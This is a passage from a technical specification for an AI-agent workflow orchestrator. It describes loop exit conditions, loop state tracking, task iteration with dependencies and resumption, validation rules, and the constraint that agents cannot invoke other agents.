  expression: "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD"
  description: "Exit when delta below threshold"

# Quality gate
exit_condition:
  expression: "$ERROR_COUNT == 0 && $QUALITY_SCORE >= 95"
  description: "Exit when error-free and quality threshold met"

# Boolean check
exit_condition:
  expression: "!$HAS_ERRORS"
  description: "Exit when no errors present"

# String equality
exit_condition:
  expression: "$STATUS == 'complete'"
  description: "Exit when status is complete"
```

**Evaluation Process**:
1. **Startup Validation**: Expression syntax validated during workflow initialization
2. **Runtime Resolution**: Parameters resolved from `runtime-parameters.yaml` after each iteration
3. **Expression Evaluation**: Translated to bash/bc and evaluated safely
4. **Loop Decision**: If expression evaluates to `true`, loop exits; if `false`, continues

**Error Handling**:
- **Startup errors** (invalid syntax, undeclared parameters): Workflow aborts before execution
- **Runtime errors** (missing parameter values): Workflow aborts with clear error message
- **Evaluation errors** (type mismatches): Logged as warnings, may abort based on severity

**Comparison: exit_condition vs Phase Override**:

| Aspect | exit_condition | Phase Override (LOOP_CONTINUE) |
|--------|----------------|-------------------------------|
| **Configuration** | Declarative in workflow.yaml | Imperative in phase logic |
| **Visibility** | Explicit in workflow definition | Hidden in phase implementation |
| **Validation** | Validated at startup | No startup validation |
| **Flexibility** | Fixed expression | Dynamic decision logic |
| **Complexity** | Simple boolean expressions | Arbitrary bash logic |
| **Best For** | Standard convergence tests | Complex decision logic |
| **Priority** | Lower (step 3) | Higher (step 2) |

**When to Use exit_condition**:
- Convergence testing with standard thresholds
- Quality gates with clear numeric/boolean criteria
- Simple exit criteria that don't require complex logic
- When visibility and documentation are important

**When to Use Phase Override**:
- Complex decision logic with multiple factors
- Need to inspect files or run validation commands
- Dynamic threshold adjustment
- Exceptional exit conditions (errors, early termination)

**Hybrid Approach**:
Both mechanisms can coexist:
```yaml
exit_condition:
  expression: "$DELTA < $THRESHOLD"  # Standard convergence check
allow_phase_control: true            # Allow phase to override for errors
```

Phase can override exit_condition by setting `LOOP_CONTINUE=false` for exceptional cases.

### Automatic Loop Parameters

The orchestrator automatically injects these parameters for all phases within a loop:

| Parameter | Type | Description | Example |
|-----------|------|-------------|---------|
| `LOOP_INDEX` | integer | Current iteration number (1-based) | 3 |
| `LOOP_NAME` | string | Loop identifier | "refinement-loop" |
| `LOOP_ITERATION` | integer | Alias for LOOP_INDEX | 3 |

**Injection Timing**: These parameters are injected before the FIRST iteration (starting with `LOOP_INDEX=1`) and updated before each subsequent iteration. All loop phases have access to these parameters from iteration 1 onward.

These parameters are available for conditional logic and logging within loop phases.

### Loop State Tracking

The orchestrator creates and maintains `loop_state.yaml` in the run directory:

**File Location**: `<workflow-dir>/runs/<workflow_run_id>/loop_state.yaml`

**Structure**:
```yaml
loops:
  refinement-loop:
    current_iteration: 3
    total_iterations: 3
    max_iterations: 20
    # Optional: Include exit_condition if specified in workflow.yaml
    exit_condition:
      expression: "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD"
      description: "Exit when convergence achieved"
      validated: true
      parameters_used: ["CONVERGENCE_DELTA", "CONVERGENCE_THRESHOLD"]
    iteration_history:
      - iteration: 1
        timestamp: "2025-01-15T10:30:00Z"
        duration_seconds: 45
        # Include exit_condition evaluation details if applicable
        exit_condition_checked: true
        exit_condition_result: false
        exit_condition_resolved: "0.15 < 0.01"
      - iteration: 2
        timestamp: "2025-01-15T10:35:00Z"
        duration_seconds: 52
        exit_condition_checked: true
        exit_condition_result: false
        exit_condition_resolved: "0.08 < 0.01"
      - iteration: 3
        timestamp: "2025-01-15T10:40:00Z"
        duration_seconds: 48
        exit_condition_checked: true
        exit_condition_result: true
        exit_condition_resolved: "0.008 < 0.01"
    # Added when loop completes
    completed: true
    exit_reason: "exit_condition_met"
    exit_condition_expression: "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD"
    exit_condition_resolved: "0.008 < 0.01"
```

This file is updated after each iteration and can be used for monitoring loop progress.

### Execution Log Events

New event types specific to loop execution:

| Event | Description | Example |
|-------|-------------|---------|
| `LOOP_CONTINUE` | Loop continuing to next iteration | `[LOOP_CONTINUE] Loop 'refinement-loop' iteration 3/20` |
| `LOOP_EXIT_OVERRIDE` | Phase requested early exit | `[LOOP_EXIT_OVERRIDE] Phase requested exit: Converged` |
| `LOOP_CONTINUE_OVERRIDE` | Phase requested continue | `[LOOP_CONTINUE_OVERRIDE] Phase requested continue: Not converged` |
| `LOOP_COMPLETE` | Fixed iterations completed | `[LOOP_COMPLETE] Loop 'refinement-loop' completed 5 iterations` |
| `LOOP_MAX_ITERATIONS` | Safety limit reached | `[LOOP_MAX_ITERATIONS] Loop 'refinement-loop' reached limit (20)` |
| `EXIT_CONDITION_VALIDATED` | Exit condition validated at startup | `[EXIT_CONDITION_VALIDATED] Loop 'convergence-loop': $DELTA < $THRESHOLD` |
| `LOOP_EXIT_CONDITION` | Exit condition met, loop exiting | `[LOOP_EXIT_CONDITION] Loop 'convergence-loop' exit condition met` |
| `LOOP_EXIT_CONDITION_FALSE` | Exit condition not met, continuing | `[LOOP_EXIT_CONDITION_FALSE] Exit condition not met, continuing loop` |

### Example Usage Patterns

#### Pattern 1: Convergence Testing

```yaml
# workflow.yaml
loops:
  - name: convergence-loop
    description: "Iterative refinement until convergence threshold met"
    phases: [2, 3, 4]
    max_iterations: 20
    allow_phase_control: true
```

```bash
# In phase-04-validate.md
CONVERGENCE_DELTA=$(calculate_delta)

if [ $(echo "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD" | bc) -eq 1 ]; then
  echo "LOOP_CONTINUE: false"
  echo "LOOP_REASON: \"Converged (delta=$CONVERGENCE_DELTA < threshold=$CONVERGENCE_THRESHOLD)\""
else
  echo "LOOP_CONTINUE: true"
  echo "LOOP_REASON: \"Not converged (delta=$CONVERGENCE_DELTA >= threshold=$CONVERGENCE_THRESHOLD)\""
fi
```

#### Pattern 2: Quality Gates

```yaml
# workflow.yaml
loops:
  - name: quality-gate
    description: "Refine code until passing all quality checks"
    phases: [1, 2, 3]
    max_iterations: 5
    allow_phase_control: true
```

```bash
# In phase-03-validate.md
TESTS_PASSED=$(run_tests | grep -c PASS)
TOTAL_TESTS=$(run_tests | wc -l)
CODE_COVERAGE=$(measure_coverage)

if [ $TESTS_PASSED -eq $TOTAL_TESTS ] && [ $(echo "$CODE_COVERAGE >= 0.90" | bc) -eq 1 ]; then
  echo "LOOP_CONTINUE: false"
  echo "LOOP_REASON: \"Quality gates passed: ${TESTS_PASSED}/${TOTAL_TESTS} tests, ${CODE_COVERAGE} coverage\""
else
  echo "LOOP_CONTINUE: true"
  echo "LOOP_REASON: \"Quality gates not met: ${TESTS_PASSED}/${TOTAL_TESTS} tests, ${CODE_COVERAGE} coverage\""
fi
```

#### Pattern 3: Fixed Iterations

```yaml
# workflow.yaml
loops:
  - name: batch-processing
    description: "Process data in 10 batches"
    phases: [2, 3]
    max_iterations: 10
    iterations: 10              # Run exactly 10 times
    allow_phase_control: false  # No phase override needed
```

Phases simply process batch ${LOOP_INDEX} and complete. Loop runs exactly 10 times.

### Loop Behavior Details

**Phase Execution Order**:
When a loop contains phases [2, 3, 4]:
```
Iteration 1: Phase 2 → Phase 3 → Phase 4 → (evaluate loop)
Iteration 2: Phase 2 → Phase 3 → Phase 4 → (evaluate loop)
Iteration 3: Phase 2 → Phase 3 → Phase 4 → (evaluate loop)
...
```

**Parameter Persistence**:
- Parameters discovered in one iteration are available in the next iteration
- `runtime-parameters.yaml` accumulates discovered parameters across iterations
- Each iteration sees parameters from all previous iterations

**Loop Exit Points**:
1. After completing last phase of loop (only time loop is evaluated)
2. If `max_iterations` reached → workflow aborts with ERROR
3. If `LOOP_CONTINUE: false` → loop exits gracefully
4. If fixed `iterations` completed → loop exits gracefully

**Error Handling**:
- If any phase in loop fails: normal failure handling applies (retry if enabled, or abort if `stop_on_failure: true`)
- Loop state is preserved across failures for retry attempts
- Failed iteration does NOT count toward `max_iterations`

### Limitations (MVP)

**Not Supported in MVP**:
- Nested loops (loops within loops)
- Result aggregation across iterations
- Loop-specific state scoping

These features are planned for future phases after MVP validation.

### Backward Compatibility

**Workflows without `loops` section**:
- Execute identically to pre-loop implementation
- No performance overhead
- No breaking changes

**Migration Path**:
1. Existing workflows require NO changes
2. Add `loops` section only when iterative behavior needed
3. Phases can opt into loop control via `LOOP_CONTINUE` parameter
4. Gradual adoption workflow-by-workflow

## Task Iteration

### Purpose

Task iteration allows a phase to execute multiple times, once per task, to prevent context exhaustion when processing large task lists. This is particularly useful when:
- Processing many independent work items (e.g., 50+ test files)
- Each item requires minimal context
- Fresh agent context per item improves quality
- Resumption capability is important

### Configuration

Add to workflow.yaml:

```yaml
task_iteration:
  enabled: true
  phase: 4                        # Phase number to iterate
  task_index_param: TASK_INDEX_PATH  # Parameter with task index file path
  task_id_param: TASK_ID          # Parameter to pass current task ID
  task_dir: "tasks"               # Directory containing task definition files
  result_dir: "results"           # Directory for task result files
  max_retries_per_task: 2         # Retry failed tasks
  stop_on_failure: false          # Continue despite failures
  sequential: true                # Execute one task at a time
```

### Task Index Structure

The task index file defines execution order and dependencies:

**task-index.json**:
```json
{
  "metadata": {
    "total_tasks": 10,
    "generated": "2025-12-18T12:00:00Z"
  },
  "tasks": ["TASK-1", "TASK-2", "TASK-3", ...],
  "execution_order": [
    {"batch": 1, "tasks": ["TASK-1", "TASK-2"]},
    {"batch": 2, "tasks": ["TASK-3", "TASK-4"]}
  ]
}
```

- **metadata.total_tasks**: Total number of tasks
- **tasks**: Array of all task IDs
- **execution_order**: Batches of tasks to execute (batches run sequentially, tasks within batch can be parallel)

### Task Definition Files

Individual task files define task details and dependencies:

**tasks/{task-id}.json**:
```json
{
  "task_id": "TASK-1",
  "description": "Process component X",
  "dependencies": ["TASK-0"],  # Must complete before this task
  "metadata": {
    "priority": "high",
    "estimated_time": "5 minutes"
  }
}
```

### Result Files

Each task execution produces a result file:

**results/{task-id}-result.json**:
```json
{
  "task_id": "TASK-1",
  "status": "success",        # success|failure|blocked
  "error": null,              # Error message if failed
  "commit_sha": "abc123",     # Optional: Git commit if changes made
  "outputs": {
    "files_created": ["output1.txt"],
    "summary": "Task completed successfully"
  }
}
```

### Aggregated Results

All task results are aggregated into a single file:

**task-results.json**:
```json
{
  "metadata": {
    "workflow_run_id": "wf-20251218-120000-abc",
    "total_tasks": 10,
    "completed": 8,
    "failed": 1,
    "blocked": 1,
    "phase": 4
  },
  "tasks": [
    {...},  # Individual task results
    {...}
  ]
}
```

### Execution Flow

When task_iteration is enabled and the current phase matches task_iteration.phase:

1. **Load Task Index**:
   - Read task index from parameter specified by `task_index_param`
   - Validate structure and parse execution_order

2. **Initialize Tracking**:
   - Create results directory
   - Initialize completed/failed/blocked task lists

3. **Process Batches**:
   - For each batch in execution_order:
     - For each task in batch:
       - Skip if already completed (resumption support)
       - Check dependencies are satisfied
       - Launch phase-executor with TASK_ID parameter
       - Save result to results/{task-id}-result.json
       - Retry if failed (up to max_retries_per_task)
       - Stop if stop_on_failure and task failed

4. **Aggregate Results**:
   - Collect all task results
   - Generate task-results.json
   - Update runtime parameters with counts

5. **Continue or Abort**:
   - If stop_on_failure and failures exist: ABORT workflow
   - Otherwise: Continue to next phase

### Dependency Resolution

Tasks can depend on other tasks. The orchestrator:
- Checks dependency result files before executing
- Marks task as BLOCKED if dependencies not satisfied
- Skips blocked tasks (may be resolved in future iterations)

### Resumption Support

If workflow execution stops mid-task-iteration:
- Completed tasks are marked in result files
- On re-run, orchestrator skips completed tasks
- Only incomplete/failed tasks are re-executed
- Provides efficient recovery from failures

### Integration with Model Selection

Task iteration works seamlessly with per-phase model selection:
- Model resolved once for the phase (step 5a)
- All task executions use the same model
- Consistent behavior across all tasks

### Runtime Parameters

Task iteration updates runtime parameters:
- **TASKS_COMPLETED**: Number of successfully completed tasks
- **TASKS_FAILED**: Number of failed tasks
- **TASKS_BLOCKED**: Number of blocked tasks (dependencies not met)

These parameters are available to subsequent phases.

### Best Practices

1. **Task Granularity**: Keep tasks small (< 5 minutes each)
2. **Dependencies**: Minimize dependencies for better parallelism
3. **Resumption**: Use unique, stable task IDs for reliable resumption
4. **Error Handling**: Set appropriate max_retries_per_task
5. **Result Files**: Phases should always create result files with status

### Example Usage

**workflow.yaml**:
```yaml
name: test-processing
version: 1.0.0

parameters:
  TASK_INDEX_PATH:
    type: file
    required: true
    description: "Path to task index JSON file"

task_iteration:
  enabled: true
  phase: 2
  task_index_param: TASK_INDEX_PATH
  task_id_param: TASK_ID
  task_dir: "tasks"
  result_dir: "test-results"
  max_retries_per_task: 1
  stop_on_failure: false
  sequential: true

phases:
  generate_logs: true
  stop_on_failure: false
```

**phase-02-process-tests.md**:
```markdown
---
phase_metadata:
  inputs:
    parameters:
      - name: TASK_ID
        required: true
        description: "Current task ID to process"
      - name: TASK_INDEX_PATH
        required: true
        description: "Path to task index"
---

# Phase 02: Process Test

Process a single test identified by TASK_ID.

## Process

1. Read task definition from tasks/${TASK_ID}.json
2. Execute test
3. Create result file: test-results/${TASK_ID}-result.json with status

## Phase Completion Report

```yaml
phase: 2
status: success
outputs_files:
  - test-results/${TASK_ID}-result.json
```

**Benefits**

- **Context Efficiency**: Each task gets fresh agent with minimal context (~50 lines)
- **Resumable**: Automatically skip completed tasks on restart
- **Dependency Aware**: Execute tasks in correct order based on dependencies
- **Progress Tracking**: Clear visibility into task completion status
- **Failure Isolation**: Failed tasks don't block independent tasks

## Validation Rules

### Structural Validation

#### Required Elements
- [ ] workflow.yaml exists and is valid YAML
- [ ] At least two phase files exist (phase-01, phase-02)
- [ ] Phase files follow naming convention
- [ ] Sequential numbering without gaps

#### Recommended Elements
- [ ] README.md documentation exists
- [ ] Examples directory with sample parameters
- [ ] Phase 00 for parameter discovery (if needed)

### Metadata Validation

#### workflow.yaml Requirements
- [ ] `name` field present and valid (kebab-case)
- [ ] `description` field present and non-empty
- [ ] `version` field present and valid semver
- [ ] All parameters have required fields
- [ ] Parameter types are valid
- [ ] Default values match declared types

#### Phase Metadata Requirements
- [ ] phase_metadata section present (WARNING if missing)
- [ ] All required input parameters defined
- [ ] Output paths use valid parameter interpolation
- [ ] Parallel config complete if execution_mode=parallel

### Content Validation

#### Phase File Structure
Required sections in order:
1. Phase metadata (YAML frontmatter)
2. `# Phase N: Title` heading
3. `**Purpose**:` statement
4. `## Prerequisites` section
5. `## Tasks for Todo List` section
6. `## Parameters Used` section
7. `## Process` section with steps
8. `## Outputs` section
9. `## Success Criteria` section
10. `## Error Handling` section

Optional sections (recommended for complex phases):
- `## Rollback Plan` - Recovery procedures if phase or subsequent phases fail
- `## Notes` - Additional context, warnings, or implementation notes

### Conditional Execution (Prerequisites)

Phase files can include conditional prerequisites that control execution flow:

```yaml
phase_metadata:
  prerequisites:
    - condition: "$ENVIRONMENT == 'production'"
      action: require_approval
    - condition: "$SKIP_TESTS == true"
      action: skip_phase
```

#### Condition Syntax

Conditions use simple expression syntax with parameter interpolation:

**Comparison Operators**:
- `==` - Equality (string or numeric)
- `!=` - Inequality
- `>`, `<`, `>=`, `<=` - Numeric comparison

**Logical Operators**:
- `&&` - Logical AND
- `||` - Logical OR
- `!` - Logical NOT (prefix)

**Parameter References**:
- `$PARAM_NAME` - Simple reference
- `${PARAM_NAME}` - Explicit boundary reference

**Literal Values**:
- Strings: `'value'` or `"value"`
- Numbers: `42`, `3.14`
- Booleans: `true`, `false`

**Examples**:
```yaml
# Single condition
condition: "$ENVIRONMENT == 'production'"

# Compound condition
condition: "$ENVIRONMENT == 'production' && $BACKUP_ENABLED == true"

# Numeric comparison
condition: "$RETRY_COUNT >= 3"

# Negation
condition: "!$SKIP_VALIDATION"
```

#### Available Actions

| Action | Description |
|--------|-------------|
| `require_approval` | Pause and ask user for confirmation before proceeding |
| `skip_phase` | Skip this phase entirely, continue with next phase |
| `fail_phase` | Immediately fail the phase with condition as reason |
| `warning` | Log a warning but continue execution |

### Cross-File Validation

#### Parameter Flow
- [ ] Workflow parameters available to all phases
- [ ] Phase output parameters available to subsequent phases
- [ ] No undefined parameter references
- [ ] No orphaned parameters

#### Dependency Chain
- [ ] Input files reference available outputs
- [ ] No circular dependencies
- [ ] File paths are valid
- [ ] Required files generated before use

## Agent Constraints {#agent-constraints}

### Fundamental Limitation
**Agents CANNOT invoke other agents**. This is enforced at the system level:
- Task tool not available within agents
- No `claude -p` commands allowed
- No nested execution possible
- Ensures system stability

### Design Implications
1. **Sequential Phases**: Break complex work into multiple phases
2. **Parallel Within Phase**: Use parallel execution for similar items
3. **Specialized Agents**: Orchestrator selects appropriate agent per phase
4. **No Delegation**: Agents must complete work directly

### Agent Selection
The orchestrator can use different agents for different phases:
- Default: `phase-executor` for isolation
- Specialized: Agent specified in `preferred_agent` field
- Parallel: Agent specified in `parallel_config.agent_type`

## Validation Severity Levels

### ERROR (Blocking)
- Missing workflow.yaml
- Invalid YAML syntax
- No phase files
- Non-sequential phase numbers
- Circular dependencies
- Invalid parameter types

### WARNING (Non-blocking)
- Missing phase_metadata sections
- No README.md
- Undefined parameters used
- Missing recommended sections
- Large phase files (>500 lines)

### INFO (Suggestions)
- Could use parallel execution
- Parameter naming inconsistencies
- Missing examples directory
- Documentation improvements
- Performance optimizations

## Schema Validation

Workflows can be validated against formal schemas:
- `workflow-schema.yaml` - Validates workflow.yaml structure
- `phase-metadata-schema.yaml` - Validates phase metadata
- Use `validate-workflow` command for comprehensive checks

## Future Features (Not Implemented)

The following features are planned but not currently supported. They are documented in INTRODUCTION.md for illustration purposes only.

### Phase Groups (Concurrent Phase Execution)
```yaml
# FUTURE FEATURE - NOT YET SUPPORTED
phase_groups:
  - [phase-02a-api.md, phase-02b-ui.md, phase-02c-db.md]
```
**Status**: All phases execute sequentially in numeric order. Use `execution_mode: parallel` within individual phases for concurrent work item processing.

### Dynamic Phase Generation
```yaml
# FUTURE FEATURE - NOT YET SUPPORTED
dynamic_phases:
  enabled: true
  generator: phase-00-analyze.md
```
**Status**: All phases must be defined statically in phase files.

### Cross-Workflow Dependencies
```yaml
# FUTURE FEATURE - NOT YET SUPPORTED
dependencies:
  - workflow: prerequisites
    outputs: [config.yaml, setup.log]
```
**Status**: Each workflow operates independently. Run workflows in sequence manually.

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2025-01-12 | Initial specification |

## References
- [INTRODUCTION.md](INTRODUCTION.md) - Conceptual overview
- [workflow-schema.yaml](../schemas/workflow-schema.yaml) - Formal schema
- [REFERENCE.md](REFERENCE.md) - Quick reference card